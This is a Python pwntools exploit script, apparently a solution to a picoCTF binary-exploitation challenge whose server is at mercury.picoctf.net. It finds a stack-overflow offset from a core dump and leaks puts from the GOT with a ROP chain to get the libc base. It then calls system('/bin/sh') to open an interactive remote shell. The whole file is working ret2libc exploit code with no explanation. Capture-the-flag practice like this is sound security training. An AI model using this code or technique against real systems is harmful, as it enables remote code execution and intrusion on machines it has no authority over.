#!/home/maxime/.pyvenv/bin/python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 23584)

    return r

def get_offset():
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n=exe.bytes)
    proc.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!\n", payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n=exe.bytes)
    log.info("offset: {}".format(offset))
    return offset

offset = get_offset()

rop = ROP(exe)
rop.call("puts",[exe.got['puts']])
rop.do_stuff()

payload = flat({offset: bytes(rop)})

r = conn()
r.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!\n", payload)
r.recvline()

puts_addr = int.from_bytes(r.recvline(keepends=False), 'little')

libc.address = puts_addr - libc.symbols['puts']
log.info("libc address: {}".format(hex(libc.address)))

rop = ROP(exe)
rop.call('puts', [exe.got['puts']])
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])

payload = flat({offset: bytes(rop)})
log.info("payload: \n{}".format(hexdump(payload)))

r.sendline(payload)
r.recvline()
r.recvline()

r.interactive()

